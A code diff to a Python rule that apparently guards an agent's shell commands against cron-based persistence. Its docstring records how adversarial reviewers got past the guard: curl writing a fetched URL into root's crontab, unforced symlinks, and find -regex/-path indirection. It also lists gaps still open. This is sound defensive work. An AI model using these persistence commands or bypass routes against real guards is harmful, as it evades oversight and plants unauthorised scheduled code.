@@ -2779,29 +2779,71 @@ def rule_cron_persist_protect(ev: Event, policy=None) -> Optional[Decision]:
     can't wave itself past its own guard" invariant every escapable guard in
     this file holds.
 
+    QA history (two independent adversarial reviews, run in parallel, same
+    convention ``rule_service_persist_protect``/``rule_hook_manager_protect``
+    used): round A (design/consistency) found ``CRON_FILE_PATH_RE`` was
+    missing from ``rule_fetch_to_file_protect``'s ``_FETCH_HUMAN_ESCAPABLE``
+    enumeration — every other sibling guard's target regex is listed there
+    so a direct fetch-to-file write is caught as a backstop, but cron's was
+    omitted; verified live, ``curl -o /var/spool/cron/crontabs/root
+    <url>`` returned a full ``ALLOW`` with no rule firing at all, a
+    complete, silent bypass of exactly the spool-crontab vector this guard
+    exists for. Fixed by adding the entry (closing the gap the paragraph
+    below used to disclose as open). Round B (bypass-hunting) found three
+    real bugs: (1) a *bare*, unforced ``ln``/``ln -s``/PowerShell
+    ``New-Item -ItemType SymbolicLink`` planting a brand-new spool
+    crontab sailed through as ``ALLOW`` — ``FORCED_LINK_WRITE_RE`` only
+    fires on ``-f``/``--force``, correct for a guard protecting an
+    EXISTING tracked file (an unforced ``ln`` simply fails if the
+    destination exists) but wrong for this guard, whose whole threat model
+    is planting a file that doesn't exist yet; fixed by adding
+    ``COPY_WRITE_VERB_RE`` (already used by ``rule_conftest_protect``/
+    ``rule_pysite_protect``/``rule_ipython_startup_protect``/
+    ``rule_hook_manager_protect``/``rule_self_protect`` for the identical
+    "planting a new file" threat model) to this guard's shell write-verb
+    checks. (2) ``find -regex``'s interior dot in ``cron\\.d``/
+    ``cron\\.(?:hourly|...)`` broke the naive fragment the exact same way
+    already found and fixed for ``LD_PRELOAD_FIND_RE`` — but never ported
+    here — fixed identically, tolerating an optional literal backslash
+    before each interior dot; this also disproved the assumption (below)
+    that containment's ``PERSIST_RE`` already backstops every
+    ``/etc/cron*`` surface, since neither ``/etc/cron`` nor a bare
+    ``crontab`` appears in that PoC at all. (3) the ``spool[/\\\\]cron``
+    fragment required a literal separator, but ``find -regex`` is POSIX
+    ERE (an unescaped ``.`` matches any character) and ``find -path`` is a
+    shell glob (``*`` matches any string) — both ordinary usage, not
+    obfuscation — so ``find / -regex '.*var.spool.cron.root'`` and
+    ``-path '*var*spool*cron*root'`` named the RHEL-layout spool crontab
+    with neither word adjacent to a real separator; fixed by widening the
+    fragment to a small bounded any-character gap. See
+    ``_CRON_FIND_FRAGMENTS``'s own comment in ``patterns.py`` for the
+    fragment-level detail on (2)/(3).
+
     Honest scope, the same denylist trade-offs every guard in this file
     discloses: a path assembled indirectly (shell variable concatenation
     across separate assignments, a ``for``/``xargs`` loop, ``basename``/
     ``dirname`` reconstruction) rather than appearing as one contiguous
-    literal is not caught; a direct fetch-to-file write (``curl -o
-    /etc/cron.d/evil ...``, ``wget -O ...``) is caught by none of the shell
-    branch's six write-verb checks — the same inherited gap every other
-    guard in this file already discloses, closed only for the surfaces
-    ``rule_fetch_to_file_protect`` itself enumerates; the bare word
-    ``crontab``/``crontabs`` is deliberately excluded from the
-    ``find``-indirection fallback since PERSIST_RE already denies any shell
-    text containing it non-escapably regardless of ``find`` syntax, so
-    adding it here would only be a redundant, never-reached branch; the
-    macOS spool layout (``/usr/lib/cron/tabs/<user>``) is not covered — this
-    guard targets the Linux crond mechanism, the same platform split
+    literal is not caught; the bare word ``crontab``/``crontabs`` is
+    deliberately excluded from the ``find``-indirection fallback since
+    PERSIST_RE already denies any shell text containing it non-escapably
+    regardless of ``find`` syntax, so adding it here would only be a
+    redundant, never-reached branch; the macOS spool layout
+    (``/usr/lib/cron/tabs/<user>``) is not covered — this guard targets the
+    Linux crond mechanism, the same platform split
     ``rule_service_persist_protect`` already draws between systemd (Linux)
-    and launchd (macOS); and the shell-branch spool-crontab check treats any
+    and launchd (macOS); the shell-branch spool-crontab check treats any
     file inside ``/var/spool/cron/`` (or its Debian/Ubuntu ``crontabs/``
     subdirectory) as sensitive rather than validating the trailing segment
     against a real system username — the same "conservative over-match
     beats a real parse of a system table" trade-off ``CRON_FILE_PATH_RE``
     itself already accepts, and safe in the direction every guard in this
-    file already prefers (an extra ask, never a missed deny)."""
+    file already prefers (an extra ask, never a missed deny); and the
+    ``COPY_WRITE_VERB_RE``/``FORCED_LINK_WRITE_RE`` mismatch round B closed
+    here (bare link verbs need no force flag to plant a brand-new file) is
+    a shared-infrastructure gap that likely also affects
+    ``rule_service_persist_protect``/``rule_ld_preload_protect`` (both use
+    only ``FORCED_LINK_WRITE_RE`` as their own link-verb check) — not fixed
+    there, out of this guard's scope."""
     cfg = getattr(policy, "cron_persist", None) or {}
     raw_mode = cfg.get("mode", "ask")
     mode = str(raw_mode).lower()
@@ -2842,7 +2884,8 @@ def rule_cron_persist_protect(ev: Event, policy=None) -> Optional[Decision]:
             or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
             or patterns.INPLACE_WRITE_RE.search(cmd)
             or patterns.FORCED_LINK_WRITE_RE.search(cmd)
-            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
+            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd)
+            or patterns.COPY_WRITE_VERB_RE.search(cmd))
         if not touches_target:
             return None
         if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_CRON_PERSIST")
